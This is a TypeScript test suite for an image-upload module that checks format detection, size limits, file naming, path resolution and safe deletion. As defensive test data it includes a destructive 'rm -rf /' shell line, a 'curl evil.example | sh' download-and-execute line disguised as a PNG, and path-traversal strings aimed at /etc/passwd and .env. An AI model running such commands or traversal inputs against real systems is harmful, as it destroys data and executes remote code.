import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// UPLOAD_DIR is read at import time, so it has to be set before the module
// under test is loaded.
const dir = await mkdtemp(join(tmpdir(), 'kado-uploads-'));
process.env.UPLOAD_DIR = dir;

const {
  deleteUpload,
  detectImageType,
  etagFor,
  mimeForFile,
  resolveUploadPath,
  storeUpload,
} = await import('./uploads');

/** A minimal but genuinely-shaped file of each type. */
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0]);
const GIF = Buffer.from('GIF89a-------', 'ascii');
const WEBP = Buffer.concat([
  Buffer.from('RIFF', 'ascii'),
  Buffer.from([0, 0, 0, 0]),
  Buffer.from('WEBP', 'ascii'),
  Buffer.from([0, 0, 0, 0]),
]);

function asFile(bytes: Buffer, name: string, type = 'image/png') {
  return new File([new Uint8Array(bytes)], name, { type });
}

describe('recognising an image', () => {
  it('accepts the four formats we support', () => {
    expect(detectImageType(PNG)?.ext).toBe('png');
    expect(detectImageType(JPEG)?.ext).toBe('jpg');
    expect(detectImageType(GIF)?.ext).toBe('gif');
    expect(detectImageType(WEBP)?.ext).toBe('webp');
  });

  it('rejects something that is not an image', () => {
    expect(detectImageType(Buffer.from('#!/bin/sh\nrm -rf /', 'ascii'))).toBeNull();
  });
});

describe('storing an upload', () => {
  it('writes the file and returns a path under /uploads', async () => {
    const result = await storeUpload(asFile(PNG, 'photo.png'), 'gifts');
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.path).toMatch(/^\/uploads\/gifts\/[\w-]+\.png$/);
    const onDisk = await readFile(join(dir, 'gifts', result.path.split('/').pop()!));
    expect(onDisk.equals(PNG)).toBe(true);
  });

  /**
   * The browser's Content-Type is a claim, not evidence. A script renamed
   * .png and declared image/png would sail through a MIME-only check.
   */
  it('refuses a script dressed up as a PNG', async () => {
    const evil = Buffer.from('#!/bin/sh\ncurl evil.example | sh', 'ascii');
    const result = await storeUpload(asFile(evil, 'photo.png', 'image/png'), 'gifts');

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error).toMatch(/Format non reconnu/);
  });

  it('names the file itself rather than trusting the uploader', async () => {
    const result = await storeUpload(
      asFile(PNG, '../../../etc/passwd.png'),
      'gifts',
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // Nothing of the supplied name survives.
    expect(result.path).not.toContain('..');
    expect(result.path).not.toContain('passwd');
  });

  it('refuses a file over the size limit', async () => {
    const huge = new File(
      [new Uint8Array(Buffer.alloc(5 * 1024 * 1024, 1))],
      'big.png',
      { type: 'image/png' },
    );
    const result = await storeUpload(huge, 'gifts');
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error).toMatch(/4 Mo/);
  });

  it('refuses an empty file', async () => {
    const result = await storeUpload(asFile(Buffer.alloc(0), 'empty.png'), 'gifts');
    expect(result.ok).toBe(false);
  });

  it('gives two uploads of identical bytes separate paths', async () => {
    const a = await storeUpload(asFile(PNG, 'a.png'), 'gifts');
    const b = await storeUpload(asFile(PNG, 'b.png'), 'gifts');
    expect(a.ok && b.ok && a.path !== b.path).toBe(true);
  });
});

describe('resolving a stored path', () => {
  it('accepts a well-formed name', () => {
    expect(resolveUploadPath('gifts', 'abc-123.png')).toContain('gifts');
  });

  /** The router hands us raw segments; none of these may escape the directory. */
  it.each([
    ['gifts', '../../../etc/passwd'],
    ['gifts', '..%2F..%2Fetc%2Fpasswd'],
    ['../secrets', 'a.png'],
    ['gifts', 'a.png/../../b'],
    ['gifts', 'shell.sh'],
    ['gifts', '.env'],
  ])('refuses %s / %s', (kind, name) => {
    expect(resolveUploadPath(kind, name)).toBeNull();
  });
});

describe('deleting an upload', () => {
  it('removes a file we stored', async () => {
    const result = await storeUpload(asFile(JPEG, 'x.jpg'), 'avatars');
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    await deleteUpload(result.path);
    await expect(
      readFile(join(dir, 'avatars', result.path.split('/').pop()!)),
    ).rejects.toThrow();
  });

  it('ignores an external URL rather than trying to unlink it', async () => {
    // Gifts may carry an imageUrl that was never an upload.
    await expect(
      deleteUpload('https://example.com/photo.png'),
    ).resolves.toBeUndefined();
  });

  it('will not delete outside the upload directory', async () => {
    const outside = join(dir, 'keep-me.txt');
    await writeFile(outside, 'still here');

    await deleteUpload('/uploads/gifts/../../keep-me.txt');

    expect((await readFile(outside)).toString()).toBe('still here');
  });

  it('treats an already-missing file as success', async () => {
    await expect(
      deleteUpload('/uploads/gifts/does-not-exist.png'),
    ).resolves.toBeUndefined();
  });
});

describe('serving metadata', () => {
  it('maps each extension to its type', () => {
    expect(mimeForFile('a.png')).toBe('image/png');
    expect(mimeForFile('a.jpg')).toBe('image/jpeg');
    expect(mimeForFile('a.webp')).toBe('image/webp');
    expect(mimeForFile('a.gif')).toBe('image/gif');
  });

  it('gives identical bytes the same etag and different bytes another', () => {
    expect(etagFor(PNG)).toBe(etagFor(Buffer.from(PNG)));
    expect(etagFor(PNG)).not.toBe(etagFor(JPEG));
  });
});
